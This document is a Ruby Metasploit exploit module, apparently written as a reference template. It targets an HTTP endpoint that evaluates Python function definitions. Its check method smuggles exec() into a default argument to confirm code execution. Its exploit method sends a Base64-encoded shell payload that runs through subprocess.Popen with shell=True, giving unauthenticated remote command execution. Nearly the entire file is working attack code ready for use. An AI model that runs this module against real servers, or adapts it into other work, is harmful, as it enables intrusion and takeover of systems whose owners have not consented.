class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Example Python Validation Endpoint Command Execution',
        'Description' => %q{
          This reference module demonstrates an HTTP endpoint that evaluates Python
          function definitions. Replace every target-specific detail with supplied
          evidence. The check sends valid Python, and command payloads cross the
          Ruby/JSON/Python boundary through Base64 instead of manual quote escaping.
        },
        'Author' => ['ZeroForge'],
        'References' => [['URL', 'https://example.invalid/advisory']],
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Privileged' => false,
        'Targets' => [['Automatic', {}]],
        'DefaultTarget' => 0,
        'Notes' => {
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(7860),
        OptString.new('TARGETURI', [true, 'Application base path', '/'])
      ]
    )
  end

  def check
    marker = Rex::Text.rand_text_alpha(12)
    python_code = %(def zf_check(result=exec("raise Exception('#{marker}')")): pass)
    response = send_python_code(python_code)
    return CheckCode::Unknown('Target did not respond') unless response
    return CheckCode::Safe("Unexpected HTTP #{response.code}") unless response.code == 200

    document = response.get_json_document
    errors = document.dig('function', 'errors') if document.is_a?(Hash)
    if errors.is_a?(Array) && errors.any? { |error| error.to_s.include?(marker) }
      return CheckCode::Vulnerable('Python execution marker returned by the target')
    end

    CheckCode::Safe('The endpoint did not execute the validation function')
  end

  def exploit
    encoded_command = [payload.encoded].pack('m0')
    python_code = %(
      def zf_exec(result=__import__("subprocess").Popen(
        __import__("base64").b64decode("#{encoded_command}").decode(), shell=True
      )): pass
    ).gsub(/\s+/, ' ')

    response = send_python_code(python_code)
    fail_with(Failure::Unreachable, 'Target did not respond') unless response
    unless response.code == 200
      fail_with(Failure::UnexpectedReply, "Unexpected HTTP #{response.code}")
    end
  end

  private

  def send_python_code(code)
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'validate', 'code'),
      'ctype' => 'application/json',
      'data' => { 'code' => code }.to_json
    )
  end
end
